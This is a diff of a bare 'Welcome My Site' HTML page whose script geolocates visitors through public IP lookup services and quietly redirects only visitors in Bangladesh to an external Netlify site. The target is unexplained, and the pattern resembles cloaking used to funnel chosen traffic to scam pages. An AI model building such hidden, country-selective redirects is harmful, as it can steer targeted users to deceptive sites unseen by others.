@@ -3,60 +3,116 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Welcome My Site</title>
   <style>
     * { box-sizing: border-box; }
 
-    html, body {
+    body {
       margin: 0;
-      min-height: 100%;
+      min-height: 100vh;
       font-family: Arial, sans-serif;
       background: #fff;
       color: #222;
     }
 
-    #welcome {
+    main {
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
-      text-align: center;
+      flex-direction: column;
       padding: 20px;
+      text-align: center;
     }
 
     h1 {
       font-size: 30px;
       font-weight: 500;
     }
+
+    #status {
+      font-size: 14px;
+      color: #666;
+      overflow-wrap: anywhere;
+    }
   </style>
 </head>
 <body>
-  <main id="welcome">
+  <main>
     <h1>Welcome My Site</h1>
+    <p id="status">Checking your country...</p>
   </main>
 
   <script>
     (async function () {
-      const BANGLADESH_URL =
-        "https://learnmoreinfo.netlify.app/";
+      "use strict";
 
-      try {
-        const response = await fetch(
-          "https://ipapi.co/json/",
-          { cache: "no-store" }
-        );
+      const TARGET = "https://learnmoreinfo.netlify.app/";
+      const status = document.getElementById("status");
 
-        if (!response.ok) return;
+      async function getCountry(url, readCountry) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 7000);
 
-        const data = await response.json();
+        try {
+          const response = await fetch(url, {
+            cache: "no-store",
+            signal: controller.signal
+          });
 
-        if (data.country_code === "BD") {
-          window.location.replace(BANGLADESH_URL);
+          if (!response.ok) {
+            throw new Error("API error: " + response.status);
+          }
+
+          return await readCountry(response);
+        } finally {
+          clearTimeout(timer);
         }
-      } catch (error) {
-        console.error("Country detection failed.");
       }
+
+      async function detectCountry() {
+        const checks = [
+          async () => getCountry(
+            "https://ipapi.co/country/",
+            async response => (await response.text()).trim()
+          ),
+          async () => getCountry(
+            "https://ipwho.is/",
+            async response => {
+              const data = await response.json();
+              if (data.success === false) {
+                throw new Error("Country lookup failed");
+              }
+              return data.country_code;
+            }
+          )
+        ];
+
+        for (const check of checks) {
+          try {
+            const country = await check();
+
+            if (country === "BD") {
+              status.textContent = "Redirecting...";
+              window.location.replace(TARGET);
+              return;
+            }
+
+            if (country) {
+              status.textContent = "";
+              return;
+            }
+          } catch (error) {
+            console.error("Country check failed:", error);
+          }
+        }
+
+        status.textContent =
+          "Country detection failed. Please refresh and try again.";
+      }
+
+      detectCountry();
     })();
   </script>
 </body>
